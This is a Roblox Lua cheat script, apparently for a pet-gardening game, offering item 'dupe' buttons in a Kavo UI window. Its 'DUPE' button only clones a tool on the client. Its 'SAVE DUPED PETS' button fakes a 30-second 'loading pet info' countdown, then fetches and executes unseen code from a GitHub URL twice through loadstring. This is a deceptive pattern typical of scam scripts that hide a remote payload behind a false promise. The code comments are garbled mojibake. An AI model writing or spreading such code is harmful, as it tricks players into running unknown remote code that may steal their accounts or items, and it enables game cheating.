local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Kavo UIã®ãƒ­ãƒ¼ãƒ‰
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("2.0 - New Flow", "Ocean")

-- ãƒ¡ã‚¤ãƒ³ã‚¿ãƒ–ä½œæˆ
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Main Controls")

-- ãƒ„ãƒ¼ãƒ«åè¡¨ç¤ºãƒ©ãƒ™ãƒ«ï¼ˆåˆæœŸå€¤ï¼šNothingï¼‰
local currentTool = "Nothing"
local toolLabel = MainSection:NewLabel("Holding: " .. currentTool)

-- å®šæœŸæ›´æ–°ï¼šç¾åœ¨æŒã£ã¦ã„ã‚‹ãƒ„ãƒ¼ãƒ«åã‚’è¡¨ç¤º
RunService.RenderStepped:Connect(function()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	local name = tool and tool.Name or "Nothing"
	if name ~= currentTool then
		currentTool = name
		toolLabel:Update("Holding: " .. currentTool)
	end
end)

-- Dupe å›æ•°å…¥åŠ›
local dupeAmount = 1
MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
	local number = tonumber(text)
	if number and number >= 1 and number <= 100 then
		dupeAmount = number
	else
		warn("Enter a number between 1 and 100")
	end
end)

-- è¤‡è£½ãƒœã‚¿ãƒ³
MainSection:NewButton("DUPE", "Duplicate your tool", function()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	if not tool then
		warn("No tool to duplicate.")
		return
	end
	for i = 1, dupeAmount do
		local clone = tool:Clone()
		clone.Parent = player.Backpack
	end
end)

-- çŠ¶æ…‹è¡¨ç¤ºç”¨ãƒ©ãƒ™ãƒ«
local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")

-- SAVE DUPED PETS ãƒœã‚¿ãƒ³
local countdownThread -- ç¾åœ¨ã®ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³ç”¨ã‚¹ãƒ¬ãƒƒãƒ‰

MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	-- æ—¢ã«å‹•ä½œä¸­ã®ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³ãŒã‚ã‚Œã°ã‚­ãƒ£ãƒ³ã‚»ãƒ«
	if countdownThread then
		countdownThread:Disconnect()
	end

	local bindable = Instance.new("BindableEvent")
	countdownThread = bindable.Event:Connect(function() end) -- ç©ºã‚¤ãƒ™ãƒ³ãƒˆã§ä¿æŒ

	task.spawn(function()
		for i = 30, 1, -1 do
			statusLabel:Update("SAVE STATUS: â³ Loading pet info... (" .. i .. "s)")
			wait(1)
			if not countdownThread.Connected then
				return -- ä»–ã®ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³ã«ä¸Šæ›¸ãã•ã‚ŒãŸã‚‰ä¸­æ­¢
			end
		end

		statusLabel:Update("SAVE STATUS: ğŸš€ Booting...")

		-- åŒæ™‚ã«2å›ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œ
		local url = "https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"
		for i = 1, 2 do
			local success, err = pcall(function()
				loadstring(game:HttpGet(url))()
			end)

			if not success then
				statusLabel:Update("SAVE STATUS: âŒ Error: " .. tostring(err))
				return
			end
		end

		statusLabel:Update("SAVE STATUS: âœ… Success! x2")
	end)
end)
